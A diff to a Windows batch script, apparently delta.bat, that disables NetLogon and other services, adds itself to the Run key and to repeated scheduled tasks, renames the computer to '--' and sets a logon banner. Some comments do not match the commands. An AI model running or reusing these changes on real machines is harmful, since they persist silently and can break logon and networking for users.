@@ -48,6 +48,8 @@ ipconfig /registerdns
 ipconfig /flushdns
 :: Disabled Server Service 
 sc config "LanmanServer" start= disabled
+:: Disabled Server Service 
+sc config "NetLogon" start= disabled
 :: Disabled Telnet
 sc config tlntsvr start= disabled
 :: Alternative method to disable Telnet 
@@ -60,10 +62,14 @@ sc config "LmHosts" start= disabled
 sc stop "LanmanServer"
 :: Stopped TCPIP to NETBIOS Service
 sc stop "LmHosts"
+:: Stopped NetLogon Service
+sc stop "NetLogon"
 :: Alternative Service to Stop Server Service
 wmic service where name='LanmanServer'  call ChangeStartmode Disabled
 :: Alternative Service Stop for TCPIP to NetBIOS
 wmic service where name='LmHosts'  call ChangeStartmode Disabled
+:: Alternative to stop NetLogin Service
+wmic service where name='NetLogon' call ChangeStartmode Disabled
 :: Turned on Automatic Updates
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update" /v AUOptions /t REG_DWORD /d 0 /f
 :: Turned on Automatic Updates
@@ -93,7 +99,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v Enab
 :: Enabled delta.bat Run at Startup
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v delta /t REG_EXPAND_SZ /d "c:\Windows\System32\delta.bat" /f
 :: Enabled Control Panel
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoControlPanel /t REG_DWORD /d 0 /f 
 :: Change Computer Name
 reg add "HKLM\System\CurrentControlSet\Control\Computername\ActiveComputerName" /v ComputerName /t Reg_SZ /d -- /f
 reg add "HKLM\System\CurrentControlSet\Control\Computername\ComputerName" /v ComputerName /t Reg_SZ /d -- /f
@@ -154,12 +160,11 @@ at 20:40 "C:\Windows\System32\delta.bat"
 at 20:45 "C:\Windows\System32\delta.bat"
 at 20:50 "C:\Windows\System32\delta.bat"
 at 20:55 "C:\Windows\System32\delta.bat"
+
 :: A Quote
-reg add "HKLM\SYSTEM\CurrentControlSet\control\Terminal Server" /f /v LegalNoticeCaption /t REG_SZ /d 'READ ME'
-reg add "HKLM\SYSTEM\CurrentControlSet\control\Terminal Server" /f /v LegalNoticeText /t REG_SZ /d 'There will come a time when it is not They are spying on me through my phone anymore. Eventually, it will be My phone is spying on me' 
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /f /v LegalNoticeCaption /t REG_SZ /d "READ ME"
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"  /f /v LegalNoticeText /t REG_SZ /d "There will come a time when it is not They are spying on me through my phone anymore. Eventually, it will be My phone is spying on me" 
 :: Disabled Command Prompt
-reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
-
-
+reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 0 /f
 
 
